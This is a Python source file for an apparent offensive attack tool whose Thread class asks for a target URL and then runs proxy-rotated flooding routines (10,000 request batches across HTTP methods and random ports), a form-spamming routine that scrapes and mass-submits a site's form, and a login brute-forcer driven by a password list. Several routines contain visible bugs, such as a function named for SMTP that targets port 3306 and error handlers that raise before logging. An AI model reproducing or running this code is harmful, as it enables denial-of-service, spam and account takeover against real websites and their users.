import random, chalk, os, math, urllib, socket
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urljoin
from time import perf_counter
from .File import File
from src.utils.functions import xhr, checkValidUrl, get_proxies, random_str, random_id, random_ip, get_element_from_selector, random_user_agent, url_port_join, check_list_index, now
from src.utils.io import log, question, confirm
from src.constants.paths import PATH_PROGRAM
from src.constants.ports import ports
from src.constants.config import config

class Thread:
    @staticmethod
    def smtp_killer () -> None:
        url = question("input url target")
        urlJoined = url_port_join(url, 3306)
        
        if not checkValidUrl(url):
            Thread.smtp_killer()
        
        start = perf_counter()
        proxies = get_proxies(f"{ PATH_PROGRAM }/proxies.txt")
        total = 1000*10
        
        def func (iteration):
            methods = ["get"]
            
            try:
                proxy = {
                  "http": random.choice(proxies)
                }
                
                for method in methods:
                    output = xhr(method, urlJoined, proxies=proxy)
                    stop = perf_counter()
                    
                    if output:
                        log("info", f"| [{ math.floor(stop - start) }s] | { output }")
                        
            except Exception as err:
                log("error", str(err))
                
        with ThreadPoolExecutor(max_workers=config.workers) as executor:
            executor.map(func, range(0, int(total)))
        
        
        stop = perf_counter()
        log("info", f"time taken { stop - start }")
    
    @staticmethod
    def basic () -> None:
        url = question("input url target")
        url = url_port_join(url, ports["ssl"])
        
        if not checkValidUrl(url):
            Thread.basic()
        
        start = perf_counter()
        proxies = get_proxies(f"{ PATH_PROGRAM }/proxies.txt")
        total = 1000*10
        
        def func (iteration):
            methods = ["get", "post"]
            
            try:
                proxy = {
                  "http": random.choice(proxies)
                }
                
                for method in methods:
                    output = xhr(method, url, proxies=proxy)
                    stop = perf_counter()
                    
                    if output:
                        log("info", f"| [{ math.floor(stop - start) }s] | { output }")
                        
            except Exception as err:
                log("error", str(err))
                
        with ThreadPoolExecutor(max_workers=config.workers) as executor:
            executor.map(func, range(0, int(total)))
        
        
        stop = perf_counter()
        log("info", f"time taken { stop - start }")
    
    @staticmethod
    def all_requests () -> None:
        url = question("input url target")
        
        if not checkValidUrl(url):
            Thread.all_requests()
        
        start = perf_counter()
        proxies = get_proxies(f"{ PATH_PROGRAM }/proxies.txt")
        total = 1000*10
        
        def func (iteration):
            methods = ["head", "get", "post", "delete", "patch", "put"]
            urlJoined = url_port_join(url, ports[random.choice(list(ports))])
            
            try:
                proxy = {
                  "http": random.choice(proxies)
                }
                
                for method in methods:
                    output = xhr(method, urlJoined, proxies=proxy)
                    stop = perf_counter()
                    
                    if output:
                        log("info", f"| [{ math.floor(stop - start) }s] | { output }")
                        
            except Exception as err:
                raise err
                log("error", str(err))
                
        with ThreadPoolExecutor(max_workers=config.workers) as executor:
            executor.map(func, range(0, int(total)))
        
        
        stop = perf_counter()
        log("info", f"time taken { stop - start }")
    
    @staticmethod
    def all_ports ():
        url = question("input url target")
        
        if not checkValidUrl(url):
            Thread.all_requests()
        
        start = perf_counter()
        proxies = get_proxies(f"{ PATH_PROGRAM }/proxies.txt")
        total = 1000*10
        
        def func (iteration):
            methods = ["head", "get", "post"]
            
            try:
                proxy = {
                  "http": random.choice(proxies)
                }
                url = url_port_join(url, ports[random.choice(list(ports))])
                
                for method in methods:
                    output = xhr(method, url, proxies=proxy)
                    stop = perf_counter()
                    
                    if output:
                        log("info", f"| [{ math.floor(stop - start) }s] | { output }")
                        
            except Exception as err:
                log("error", str(err))
                
        with ThreadPoolExecutor(max_workers=config.workers) as executor:
            executor.map(func, range(0, int(total)))
        
        
        stop = perf_counter()
        log("info", f"time taken { stop - start }")
    
    @staticmethod
    def spam_post () -> None:
        url = question("input url target")
        total = 1000*10
        
        if not checkValidUrl(url):
            Thread.spam_post()
        start = perf_counter()
        proxies = get_proxies(f"{ PATH_PROGRAM }/proxies.txt")
        html = ""
        formTarget = ""
        data = {}
        
        try:
            html = xhr("get", url, proxies={
              "http": random.choice(proxies)
            }, mode="return").text
        except Exception as err:
            raise err
            log("error", f"failed fetch { url }, make sure this url is correct !")
            exit()
        
        if confirm ("use form selector"):
            form = get_element_from_selector(html)
            inputElements = form.find_all(["input", "textarea", "select"])
            formTarget = urljoin(url, form.get("action")) if form.get("action") != "" else url
            
            for inputElement in inputElements:
                inputType = inputElement.get("type") if inputElement.get("type") else "text"
                inputName = inputElement.get("name") if inputElement.get("name") else "unnamed"
                tagName = inputElement.name
                  
                if tagName in ["textarea", "input"]:
                    if inputType in ["text", "hidden", "password", "address"]:
                        data[inputName] = random_str()
                    if inputType in ["date"]:
                        data[inputName] = random_date()
                    if inputType in ["number"]:
                        data[inputName] = random_id()
                    if inputType in ["email"]:
                        data[inputName] = f"{ random_str(12) }@gmail.com"
                if tagName in ["select"]:
                    options = list(filter(lambda value: value, [option.get("value") for option in inputElement.find_all("option")]))
                    data[inputName] = random.choice(options)
        else:
            log("info", f"""
hint:
  input names: firstname|lastname|username|password|email|etc...
  input Types: text|password|email|number|date|address|select|textarea
  make sure: total names and types are same, if not the type will be text automatically

default:
  form target: # or / (current url target)
""")
            formTarget = question ("form action url")
            formTarget = url if formTarget in ["#", "/"] else urljoin(url, formTarget)
            
            inputNames = filter(lambda item: item, map(lambda item: item.strip(), question("input names [divide by (,)]").split(",")))
            inputTypes = filter(lambda item: item, map(lambda item: item.strip(), question("input types [divide by (,)]").split(",")))
            
            i = 0;
            for inputName in inputNames:
                inputType = inputTypes[i] if check_list_index(i, inputTypes) else "text"
                
                if inputType in ["text", "hidden", "password", "address", "textarea", "select"]:
                    data[inputName] = random_str()
                if inputType in ["date"]:
                    data[inputName] = random_date()
                if inputType in ["number"]:
                    data[inputName] = random_id(8)
                if inputType in ["email"]:
                    data[inputName] = f"{ random_str(12) }@gmail.com"
                i += 1
        
        def func (iteration):
            methods = ["post"]
            
            try:
                proxy = {
                  "http": random.choice(proxies)
                }
                for method in methods:
                    output = xhr(method, formTarget, proxies=proxy, params=data, data=data)
                    stop = perf_counter()
                    
                    if output:
                        log("info", f"| [{ math.floor(stop - start) }s] | { output }")
                        
            except Exception as err:
                log("error", str(err))
                
        with ThreadPoolExecutor(max_workers=config.workers) as executor:
            executor.map(func, range(0, int(total)))
        
        
        stop = perf_counter()
        log("info", f"time taken { stop - start }")
    
    @staticmethod
    def bruteforce_website () -> None:
        url = question("input url target")
        
        if not checkValidUrl(url):
            Thread.bruteforce_website()
        
        isUseEmail = confirm("bruteforce by email")
        user = question("input user email") if isUseEmail else question("input username")
        
        passwords = list(set(str(File.read(f"{ PATH_PROGRAM }/src/includes/passwords.txt", "r")).split("\n")))
        
        start = perf_counter()
        proxies = get_proxies(f"{ PATH_PROGRAM }/proxies.txt")
        
        def func (password):
            methods = ["post"]
            try:
                proxy = {
                  "http": random.choice(proxies)
                }
                credentials = {}
                credentials["email" if isUseEmail else "username"] = user
                credentials["password"] = password
                
                for method in methods:
                    response = xhr(method, url, proxies=proxy, params=credentials, data=credentials, mode="return")
                    stop = perf_counter()
                    
                    pageTitle = response.text
                    if pageTitle in ["dashboard", "user"]:
                        log("success", f"| { chalk.green('access granted') } | { user } | { password } | { now() }")
                        exit()
                    else:
                        log("error", f"| { chalk.red('access denied') } | { user } | { password } | { now() }")
            except Exception as err:
                raise err
                log("error", str(err))
                
        with ThreadPoolExecutor(max_workers=config.workers) as executor:
            executor.map(func, passwords)
        
        stop = perf_counter()
        log("info", f"time taken { stop - start }")